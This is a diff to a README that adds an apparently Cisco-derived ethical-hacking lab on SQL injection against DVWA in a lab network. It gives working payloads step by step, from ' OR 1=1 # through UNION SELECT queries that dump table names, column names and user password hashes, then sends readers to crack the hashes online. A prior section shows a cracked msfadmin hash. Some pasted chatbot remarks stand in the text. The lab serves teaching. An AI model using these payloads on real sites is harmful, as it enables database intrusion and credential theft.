@@ -139,13 +139,228 @@ msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/
 Username:Password => msfadmin:msfadmin
 ```
 
----
-
-## 📁 Resources
-- [WebGoat](https://owasp.org/www-project-webgoat/)
-- [DVWA](http://www.dvwa.co.uk/)
-- [Kali Linux Tools](https://tools.kali.org/)
+Here is a GitHub `README.md` version of your **Lab - Injection Attacks** document, formatted clearly for use in a cybersecurity or ethical hacking repository:
 
 ---
 
+# 💉 Lab: Injection Attacks (DVWA - SQL Injection)
 
+This lab focuses on demonstrating SQL Injection vulnerabilities using the **Damn Vulnerable Web Application (DVWA)** and exploring SQL Injection **mitigation** strategies.
+
+---
+
+## 🎯 Objectives
+
+Websites that are connected to backend databases can be vulnerable to SQL injection. In a SQL injection exploit, an attacker enters malicious queries that interact with the application database. In this lab, you will exploit a web site vulnerability with SQL injection and research SQL injection mitigation.
+   - Part 1: Exploit an SQL Injection Vulnerability on DVWA
+   - Part 2: Research SQL Injection Mitigation
+
+
+---
+
+## Background / Scenario
+SQL injection is a common attack used by hackers to exploit SQL database-driven web applications. This type of attack involves inserting malicious SQL code or statements into an input field or URL with the goal of reveling or manipulating the database contents, causing repudiation system issues, or spoofing identities.
+
+---
+Here is a direct `README.md` conversion of your lab instructions, formatted to preserve the structure and clarity of the original Cisco-style documentation, but readable as a Markdown file for GitHub:
+
+---
+
+## 🧰 Required Resources
+- Kali VM customized for the Ethical Hacker course  
+- Internet access  
+
+---
+
+## 📝 Instructions
+
+### Part 1: Exploit an SQL Injection Vulnerability on DVWA
+
+SQL injection is a code injection technique used to exploit security vulnerabilities in the database layer of an application. These vulnerabilities could allow an attacker to execute malicious SQL commands and compromise the security of the database.
+
+In this part you will exploit a SQL vulnerability on the DVWA.
+
+---
+
+### 🔧 Step 1: Prepare DVWA for SQL Injection Exploit
+
+- Open your browser and navigate to the DVWA at: `http://10.6.6.13`
+- Enter the credentials:  
+  ```
+  Username: admin  
+  Password: password
+  ```
+- Set DVWA to **Low Security**:
+  - Click `DVWA Security` in the left pane
+  - Change the security level to **Low** and click **Submit**
+
+---
+
+### 🧪 Step 2: Check DVWA to See If a SQL Injection Vulnerability is Present
+
+- Click `SQL Injection` in the left pane
+- In the **User ID** field type:
+  ```sql
+  ' OR 1=1 #
+  ```
+- Click **Submit**
+
+Expected output:
+```
+ID: ' or 1=1 #
+First name: admin
+Surname: admin
+
+First name: Gordon
+Surname: Brown
+
+First name: Hack
+Surname: Me
+
+First name: Pablo
+Surname: Picasso
+
+First name: Bob
+Surname: Smith
+```
+
+This confirms the presence of an SQL injection vulnerability.
+
+---
+
+### 🔢 Step 3: Check for Number of Fields in the Query
+
+Try the following inputs:
+
+```sql
+1' ORDER BY 1 #
+1' ORDER BY 2 #
+1' ORDER BY 3 #
+```
+
+The third query will return:
+```
+Unknown column '3' in 'order clause'
+```
+
+➡️ This means the query uses **2 fields**.
+
+---
+
+### 🛠 Step 4: Check for Version of Database Management System (DBMS)
+
+Input:
+```sql
+1' OR 1=1 UNION SELECT 1, VERSION()#
+```
+
+Expected Output:
+```
+Surname: 5.5.58-0+deb8u1
+```
+
+➡️ Indicates the DBMS is **MySQL version 5.5.58 on Debian**
+
+---
+
+### 🗃 Step 5: Determine the Database Name
+
+Input:
+```sql
+1' OR 1=1 UNION SELECT 1, DATABASE()#
+```
+
+Expected Output:
+```
+Surname: dvwa
+```
+
+➡️ Database name is: **dvwa**
+
+---
+
+### 🗂 Step 6: Retrieve Table Names from the dvwa Database
+
+Input:
+```sql
+1' OR 1=1 UNION SELECT 1,table_name FROM information_schema.tables WHERE table_type='base table' AND table_schema='dvwa'#
+```
+
+Expected Output:
+```
+First Name: 1
+Surname: [table names]
+```
+
+#### 📌 Answer Area:
+- What are the two tables that were found?  
+- Which table do you think is the most interesting for a penetration test?
+
+---
+
+### 🔍 Step 7: Retrieve Column Names from the `users` Table
+
+Input:
+```sql
+1' OR 1=1 UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'#
+```
+
+#### 📌 Answer Area:
+- Which two columns are of most interest for the penetration test?  
+- Explain why.
+
+---
+
+### 🧑‍💻 Step 8: Retrieve the User Credentials
+
+Input:
+```sql
+1' OR 1=1 UNION SELECT user, password FROM users #
+```
+
+Expected Output:
+- Usernames and password hashes will appear
+
+#### 📌 Answer Area:
+- Which account could be the most valuable in our pentest?  
+- Try crafting queries to display contents of other fields  
+- What is the difference between the `user_id` and `user` fields?
+
+---
+
+### 🔓 Step 9: Hack the Password Hashes
+
+- Open [https://crackstation.net](https://crackstation.net)
+- Paste the password hashes retrieved from DVWA
+- Click **Crack Hashes**
+
+#### 📌 Answer Area:
+- What is the password of the **admin** account?  
+- What is the password for the user **pablo**?
+
+---
+
+## Part 2: Research SQL Injection Mitigation
+
+### 🔍 Step 1: Research Mitigation Techniques
+
+- Open a web browser  
+- Search for:
+  - `SQL injection mitigation`
+  - `SQL injection prevention`
+- Take notes on your findings
+
+---
+
+### 💡 Reflection Questions
+
+#### 📌 Answer Area:
+- What are **three mitigation methods** for preventing SQL injection exploits?
+
+---
+
+© 2017 - 2023 Cisco and/or its affiliates. All rights reserved. Cisco Public
+
+---
+
+Let me know if you’d like this exported as a `.md` file or bundled with previous content.
